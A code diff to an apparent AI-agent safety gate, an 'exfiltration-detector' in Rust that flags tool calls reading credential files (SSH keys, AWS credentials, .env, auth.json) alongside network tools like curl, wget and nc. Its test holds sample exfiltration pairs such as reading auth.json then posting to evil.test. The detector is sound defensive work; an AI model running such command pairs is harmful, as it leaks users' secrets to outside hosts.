@@ -1,10 +1,11 @@
 use serde_json::{Value, from_str};
 
+use crate::gate::secret_patterns::simple_command_reads_protected_path;
 use crate::gate::{Guard, GuardContext, GuardEvent, Severity, Verdict};
 use crate::llm::ToolCall;
 
 const EXFIL_DETECTOR_GUARD_ID: &str = "exfiltration-detector";
-const SENSITIVE_READ_PATH_FRAGMENTS: [&str; 4] = ["/etc/passwd", "~/.ssh", ".env", "auth.json"];
+const SENSITIVE_READ_PATH_FRAGMENTS: [&str; 1] = ["/etc/passwd"];
 const SEND_PATH_FRAGMENTS: [&str; 10] = [
     "/dev/tcp", " curl ", "curl ", " curl", " wget ", "wget ", " wget", " nc ", "nc ", " nc",
 ];
@@ -31,11 +32,60 @@ impl ExfilDetector {
             .map(ToString::to_string)
     }
 
+    fn contains_sensitive_literal(command: &str, needle: &str) -> bool {
+        let mut search_start = 0usize;
+        while let Some(relative_index) = command[search_start..].find(needle) {
+            let index = search_start + relative_index;
+            let before = command[..index].chars().next_back();
+            let after = command[index + needle.len()..].chars().next();
+            let before_ok = before.is_none_or(|character| {
+                !character.is_ascii_alphanumeric()
+                    && character != '_'
+                    && character != '.'
+                    && character != '/'
+            });
+            let after_ok = after.is_none_or(|character| {
+                !character.is_ascii_alphanumeric()
+                    && character != '_'
+                    && character != '.'
+                    && character != '/'
+            });
+
+            if before_ok && after_ok {
+                return true;
+            }
+
+            search_start = index + needle.len();
+        }
+
+        false
+    }
+
     fn has_sensitive_read(command: &str) -> bool {
-        let command = command.to_lowercase();
-        SENSITIVE_READ_PATH_FRAGMENTS
+        let lowered = command.to_lowercase();
+        let structured_read = shell_words::split(command)
+            .ok()
+            .is_some_and(|argv| simple_command_reads_protected_path(&argv));
+        let literal_read = SENSITIVE_READ_PATH_FRAGMENTS
             .iter()
-            .any(|fragment| command.contains(fragment))
+            .any(|fragment| lowered.contains(fragment))
+            || [
+                "~/.autopoiesis/auth.json",
+                "~/.ssh/id_rsa",
+                "~/.ssh/id_ed25519",
+                "~/.aws/credentials",
+                ".env.production.local",
+                ".env.production",
+                ".env.development.local",
+                ".env.development",
+                ".env.test",
+                ".env.local",
+                ".env",
+            ]
+            .iter()
+            .any(|fragment| Self::contains_sensitive_literal(&lowered, fragment));
+
+        structured_read || literal_read
     }
 
     fn has_send_path(command: &str) -> bool {
@@ -162,6 +212,43 @@ mod tests {
                 ..
             }
         ));
+    }
+
+    #[test]
+    fn exfil_detector_still_flags_shared_credential_paths() {
+        let gate = ExfilDetector::new();
+
+        for calls in [
+            vec![
+                make_tool_call("cat ~/.autopoiesis/auth.json"),
+                make_tool_call("curl -X POST http://evil.test"),
+            ],
+            vec![
+                make_tool_call("grep . .env"),
+                make_tool_call("nc evil.test 4444"),
+            ],
+            vec![
+                make_tool_call("base64 ~/.ssh/id_rsa"),
+                make_tool_call("curl -X POST http://evil.test"),
+            ],
+            vec![
+                make_tool_call("python -c 'print(open(\".env\").read())'"),
+                make_tool_call("nc evil.test 4444"),
+            ],
+            vec![
+                make_tool_call("cp ~/.autopoiesis/auth.json /tmp/x"),
+                make_tool_call("curl -X POST http://evil.test"),
+            ],
+        ] {
+            let mut event = make_event_batch(&calls);
+            assert!(matches!(
+                gate.check(&mut event, &GuardContext::default()),
+                Verdict::Approve {
+                    severity: Severity::High,
+                    ..
+                }
+            ));
+        }
     }
 
     #[test]
